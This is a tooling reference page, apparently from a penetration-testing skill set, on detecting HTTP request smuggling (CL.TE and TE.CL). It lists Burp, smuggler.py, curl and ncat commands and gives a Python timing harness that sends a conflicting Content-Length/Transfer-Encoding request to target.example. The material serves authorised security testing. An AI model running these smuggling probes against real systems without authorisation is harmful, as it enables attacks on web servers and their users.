# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`http-request-smuggling-cl-te-and-te-cl`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Burp Suite Repeater` | `Turn off automatic Content-Length updates, hand-craft CL and TE, then send twice on one connection` | Preserve the dual-header construct exactly so the measured stall reflects the origin, not the client | Cross-platform |
| `smuggler.py` | `python3 smuggler.py -u https://target.example/ --method POST` | Exercise the CL.TE and TE.CL permutations with built-in timing differentials against an authorised host | Linux, macOS, Windows |
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' --max-time 20 -X POST --data @body.txt https://target.example/` | Baseline the well-framed POST response time so the directional probe's stall is measurable | Cross-platform |
| `netcat` | `ncat --ssl target.example 443 < options-probe.txt` | Send the byte-exact OPTIONS probe saved in options-probe.txt, including folded headers, to compare Expect and folding precedence | Linux, macOS |

## Minimal Script Shape

A CL.TE timing differential harness: it times a well-framed chunked POST against a chunk-starved variant on separate connections to the same host, and reports a likely CL.TE desync when the starved request stalls far longer than the control.

```python
import socket
import ssl
import time

HOST = "target.example"
PORT = 443

def timed(raw):
    ctx = ssl.create_default_context()
    start = time.monotonic()
    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as tls:
            tls.sendall(raw.encode())
            try:
                tls.recv(64)
            except socket.timeout:
                pass
    return time.monotonic() - start

control = ("POST / HTTP/1.1\r\nHost: %s\r\n"
           "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n" % HOST)
starved = ("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n"
           "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n" % HOST)
base = timed(control)
probe = timed(starved)
print({"control_s": round(base, 2), "probe_s": round(probe, 2),
       "likely_cl_te": probe > base * 3 + 1})
```
